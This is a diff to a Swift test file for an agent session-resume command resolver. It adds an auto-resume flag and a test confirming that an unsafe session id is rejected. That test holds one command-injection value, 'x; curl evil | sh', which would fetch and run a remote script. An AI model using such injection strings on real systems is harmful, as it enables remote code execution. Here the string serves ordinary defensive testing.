@@ -39,7 +39,8 @@ struct AgentResumeResolverTests {
     @Test("explicit session id wins")
     func explicitID() {
         let command = AgentResumeResolver.command(
-            providerID: "tool", sessionID: "abc", cwd: "/p", registry: registry(store: []))
+            providerID: "tool", sessionID: "abc", cwd: "/p", registry: registry(store: []),
+            autoResumeEnabled: true)
         #expect(command == "tool --resume abc")
     }
 
@@ -48,21 +49,42 @@ struct AgentResumeResolverTests {
         let ref = AgentSessionRef(id: "disc", providerID: "tool", cwd: "/p", gitBranch: nil,
             title: nil, preview: nil, updatedAt: Date(timeIntervalSince1970: 5), pinned: false, archived: false)
         let command = AgentResumeResolver.command(
-            providerID: "tool", sessionID: nil, cwd: "/p", registry: registry(store: [ref]))
+            providerID: "tool", sessionID: nil, cwd: "/p", registry: registry(store: [ref]),
+            autoResumeEnabled: true)
         #expect(command == "tool --resume disc")
     }
 
     @Test("falls back to continue-latest when nothing discovered")
     func continueLatest() {
         let command = AgentResumeResolver.command(
-            providerID: "tool", sessionID: nil, cwd: "/p", registry: registry(store: []))
+            providerID: "tool", sessionID: nil, cwd: "/p", registry: registry(store: []),
+            autoResumeEnabled: true)
         #expect(command == "tool --continue")
     }
 
     @Test("unknown provider yields nil")
     func unknown() {
         let command = AgentResumeResolver.command(
-            providerID: "ghost", sessionID: nil, cwd: "/p", registry: registry(store: []))
+            providerID: "ghost", sessionID: nil, cwd: "/p", registry: registry(store: []),
+            autoResumeEnabled: true)
         #expect(command == nil)
+    }
+
+    @Test("auto-resume disabled yields nil even with explicit id")
+    func autoResumeDisabled() {
+        let command = AgentResumeResolver.command(
+            providerID: "tool", sessionID: "abc", cwd: "/p", registry: registry(store: []),
+            autoResumeEnabled: false)
+        #expect(command == nil)
+    }
+
+    @Test("unsafe discovered session id falls back to continue-latest")
+    func unsafeDiscoveredID() {
+        let ref = AgentSessionRef(id: "x; curl evil | sh", providerID: "tool", cwd: "/p", gitBranch: nil,
+            title: nil, preview: nil, updatedAt: Date(timeIntervalSince1970: 5), pinned: false, archived: false)
+        let command = AgentResumeResolver.command(
+            providerID: "tool", sessionID: nil, cwd: "/p", registry: registry(store: [ref]),
+            autoResumeEnabled: true)
+        #expect(command == "tool --continue")
     }
 }
